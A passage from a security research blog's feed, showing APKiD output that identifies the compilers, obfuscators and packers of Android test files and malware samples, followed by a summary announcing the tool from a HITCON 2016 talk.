class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : DexGuard</div><div class="line">[*] test-data/apk/dexguard_6_1.apk!classes.dex</div><div class="line"> |-&gt; anti_disassembly : illegal class name</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : DexGuard</div><div class="line">[*] test-data/apk/pikekapril.apk!classes.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : Bitwise AntiSkid</div><div class="line">[*] test-data/dex/big-endian.dex</div><div class="line"> |-&gt; abnormal : non little-endian format</div><div class="line"> |-&gt; compiler : Android SDK (dx)</div><div class="line">[*] test-data/dex/dexguard1.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : DexGuard</div><div class="line">[*] test-data/dex/dexguard2.dex</div><div class="line"> |-&gt; anti_disassembly : illegal class name</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : DexGuard</div><div class="line">[*] test-data/dex/dexguard3.dex</div><div class="line"> |-&gt; anti_disassembly : illegal class name</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : DexGuard</div><div class="line">[*] test-data/dex/dexlib1.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line">[*] test-data/dex/dexlib2.dex</div><div class="line"> |-&gt; compiler : dexlib 2.x</div><div class="line">[*] test-data/dex/dexmerge.dex</div><div class="line"> |-&gt; compiler : Android SDK (dexmerge)</div><div class="line">[*] test-data/dex/dexprotector1.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : DexProtect</div><div class="line">[*] test-data/dex/dexprotector2.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : DexProtect</div><div class="line">[*] test-data/dex/dexprotector3.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line"> |-&gt; obfuscator : DexProtect</div><div class="line">[*] test-data/dex/dx.dex</div><div class="line"> |-&gt; compiler : Android SDK (dx)</div><div class="line">[*] test-data/dex/non-standard-header.dex</div><div class="line"> |-&gt; abnormal : non-standard header size</div><div class="line"> |-&gt; compiler : Android SDK (dx)</div><div class="line">[*] test-data/dex/non_zero_link_offset.dex</div><div class="line"> |-&gt; abnormal, anti_disassembly : non-zero link offset</div><div class="line"> |-&gt; compiler : Android SDK (dx)</div><div class="line">[*] test-data/dex/non_zero_link_size.dex</div><div class="line"> |-&gt; abnormal, anti_disassembly : non-zero link size</div><div class="line"> |-&gt; compiler : Android SDK (dx)</div><div class="line">[*] test-data/samples/alibaba/apk/071d9e73a1badf763bc6bb843c51c208ad17c91b24192e79f045ed1e4fc8148a</div><div class="line"> |-&gt; packer : Alibaba</div><div class="line">[*] test-data/samples/apkprotect/9ac20091b8e82c8ff2882422450e30c03043136ca009affe59e51edabf753337</div><div class="line"> |-&gt; packer : APKProtect</div><div class="line">[*] test-data/samples/apkprotect/9ac20091b8e82c8ff2882422450e30c03043136ca009affe59e51edabf753337!classes.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line">[*] test-data/samples/apkprotect/9ac20091b8e82c8ff2882422450e30c03043136ca009affe59e51edabf753337!res/raw/ister2015050620.apk</div><div class="line"> |-&gt; packer : Bangcle</div><div class="line">[*] test-data/samples/baidu/ae369707b32a37f2b5c78f27418f90c54c7f84d5fd8f96a9e1595e27182b3173</div><div class="line"> |-&gt; packer : Baidu</div><div class="line">[*] test-data/samples/baidu/ae369707b32a37f2b5c78f27418f90c54c7f84d5fd8f96a9e1595e27182b3173!classes.dex</div><div class="line"> |-&gt; compiler : Android SDK (dx)</div><div class="line">[*] test-data/samples/bangcle/a1f851511e9ca191a97a295f7edb9bb44694b413</div><div class="line"> |-&gt; packer : Bangcle</div><div class="line">[*] test-data/samples/bangcle/a1f851511e9ca191a97a295f7edb9bb44694b413!classes.dex</div><div class="line"> |-&gt; compiler : dexlib 2.x</div><div class="line">[*] test-data/samples/bangcle/a1f851511e9ca191a97a295f7edb9bb44694b413!assets/com.mobi.screensaver.kansiphone3</div><div class="line"> |-&gt; packer : Bangcle/SecNeo (UPX)</div><div class="line">[*] test-data/samples/bangcle/elf/bf286487b7bbd549b8cdb00dc9a80a5404ed68103ff0fffd94a85907db9c439d</div><div class="line"> |-&gt; packer : newer-style Bangcle/SecNeo (UPX)</div><div class="line">[*] test-data/samples/ijiami/6d19105bedeebad4140e9b212baae4063cbd01f3</div><div class="line"> |-&gt; packer : Ijiami</div><div class="line">[*] test-data/samples/ijiami/6d19105bedeebad4140e9b212baae4063cbd01f3!classes.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line">[*] test-data/samples/ijiami/6d19105bedeebad4140e9b212baae4063cbd01f3!assets/ijm_lib/armeabi/libexec.so</div><div class="line"> |-&gt; packer : Ijiami (UPX)</div><div class="line">[*] test-data/samples/jiangu/f8493d91c4250cff4d4f9a47538a2b0b39f7c4d87e6fe4035d4c304c70b5ad1c</div><div class="line"> |-&gt; packer : Jiangu</div><div class="line">[*] test-data/samples/jiangu/f8493d91c4250cff4d4f9a47538a2b0b39f7c4d87e6fe4035d4c304c70b5ad1c!classes.dex</div><div class="line"> |-&gt; compiler : dexlib 2.x</div><div class="line">[*] test-data/samples/kiro/061af556e934fec5fdcbec732bc7128cbf5a45012310fc8ee2f39e26bd81e982</div><div class="line"> |-&gt; packer : Kiro</div><div class="line">[*] test-data/samples/kiro/061af556e934fec5fdcbec732bc7128cbf5a45012310fc8ee2f39e26bd81e982!classes.dex</div><div class="line"> |-&gt; compiler : dexlib 2.x</div><div class="line">[*] test-data/samples/level/c2d3ceea0dda80e80d7def8e9ea127b9a633208ffcb106c5db3674e1c58baac4</div><div class="line"> |-&gt; packer : &apos;qdbh&apos; (?)</div><div class="line">[*] test-data/samples/liapp/b5be20d225edf55634621aa17988a6ed3368d4f7632c8a1eb4d3fc3b6a61c325</div><div class="line"> |-&gt; packer : LIAPP</div><div class="line">[*] test-data/samples/liapp/b5be20d225edf55634621aa17988a6ed3368d4f7632c8a1eb4d3fc3b6a61c325!classes.dex</div><div class="line"> |-&gt; compiler : dexlib 2.x</div><div class="line">[*] test-data/samples/medusa/b92c0090038f3185908f2fb3b7e927da734040b9332332fc09542e20c615e083</div><div class="line"> |-&gt; packer : Medusa</div><div class="line">[*] test-data/samples/medusa/b92c0090038f3185908f2fb3b7e927da734040b9332332fc09542e20c615e083!classes.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line">[*] test-data/samples/naga/89297d34ee79adf8390a173aefd31e65c47e18c7dfc0a3f1508ca2255991efb2</div><div class="line"> |-&gt; packer : Naga</div><div class="line">[*] test-data/samples/naga/89297d34ee79adf8390a173aefd31e65c47e18c7dfc0a3f1508ca2255991efb2!classes.dex</div><div class="line"> |-&gt; compiler : Android SDK (dx)</div><div class="line">[*] test-data/samples/nqshield/997a3986cc8437772b569d0319044764a1cbac9d296af01d77c857b887c49b48</div><div class="line"> |-&gt; packer : NQ Shield</div><div class="line">[*] test-data/samples/nqshield/997a3986cc8437772b569d0319044764a1cbac9d296af01d77c857b887c49b48!classes.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line">[*] test-data/samples/qihoo360/66126fb7d5977cf8dbac401330f25d06a9101680874ae43eb6bd201f2b92c727</div><div class="line"> |-&gt; packer : Qihoo 360, Tencent</div><div class="line">[*] test-data/samples/qihoo360/66126fb7d5977cf8dbac401330f25d06a9101680874ae43eb6bd201f2b92c727!classes.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line">[*] test-data/samples/rootkit/5ddda7355599a1819e03ee881e56453f492f6cf03674347513bf26f83b81a415</div><div class="line"> |-&gt; packer : UPX (unknown, unmodified)</div><div class="line">[*] test-data/samples/tencent/66126fb7d5977cf8dbac401330f25d06a9101680874ae43eb6bd201f2b92c727</div><div class="line"> |-&gt; packer : Qihoo 360, Tencent</div><div class="line">[*] test-data/samples/tencent/66126fb7d5977cf8dbac401330f25d06a9101680874ae43eb6bd201f2b92c727!classes.dex</div><div class="line"> |-&gt; compiler : dexlib 1.x</div><div class="line">[*] test-data/samples/unicom_sdk/bb11a710258077213ce4281e78a1c19a940c02dc3ddaa5f1d8046380173e0da7</div><div class="line"> |-&gt; packer : Unicom SDK Loader</div><div class="line">[*] test-data/samples/unicom_sdk/bb11a710258077213ce4281e78a1c19a940c02dc3ddaa5f1d8046380173e0da7!classes.dex</div><div class="line"> |-&gt; compiler : Android SDK (dexmerge), dexlib 1.x</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;We recently gave a presentation at &lt;a href=&quot;http://hitcon.org/2016/CMT/&quot;&gt;HITCON 2016&lt;/a&gt; called &lt;a href=&quot;http://hitcon.org/2016/CMT/slide/day1-r0-e-1.pdf&quot;&gt;Android Compiler Fingerprinting&lt;/a&gt;&lt;br&gt; where in we released a tool called: &lt;a href=&quot;https://github.com/rednaga/APKiD&quot;&gt;APKiD&lt;/a&gt;. It’s basically PEiD for Android – it detects several compilers, obfuscators, and packers and we’re adding to it whenever we find new stuff. You’re welcome to submit your rules also.&lt;br&gt;
    
    </summary>
    
    
      <category term="apkid" scheme="https://rednaga.io/tags/apkid/"/>
    
      <category term="research" scheme="https://rednaga.io/tags/research/"/>
    
  </entry>
  
</feed>
